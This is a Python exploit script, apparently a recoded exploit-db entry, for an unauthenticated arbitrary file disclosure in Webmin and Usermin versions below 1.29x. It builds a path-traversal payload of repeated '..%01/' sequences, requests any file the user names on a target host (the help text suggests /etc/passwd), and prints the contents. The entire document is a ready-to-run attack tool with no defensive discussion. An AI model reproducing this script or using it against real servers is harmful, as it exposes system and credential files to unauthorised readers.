#!/usr/bin/python
#		Exploit for WEBMIN and USERMIN  less than 1.29x           
#		ARBITARY REMOTE FILE DISCLOSURE	
#		Vulnerability Disclosure at securitydot.net
#		Exploit reCoded by Jo√£o Sabino - https://github.com/joaosabinon
#		Wednesday 12th  August 2020
#		Original version: https://www.exploit-db.com/exploits/2017

import requests
import argparse


def main(host, file):
	try:
		page = "unauthenticated/"
		payload = "..%01/" * 40

		r = requests.get(f"{host}/{page}{payload}{file}")

		if r.status_code == 200:
			print("##########################\nExploited with successfuly\n##########################\n")
			print(r.text)
		if r.status_code != 200:
			print("##########################\nExploit failed\n##########################\n")
	except:
			print("##########################\nExploit failed\n##########################\n")


if __name__ == "__main__":
	parser = argparse.ArgumentParser()
	parser.add_argument("host", help="Add the host, ex: http://192.168.0.1")
	parser.add_argument("file", help="Add the filename, ex: /etc/passwd")
	args = parser.parse_args()	

	if args.host and args.file:
		main(args.host, args.file)
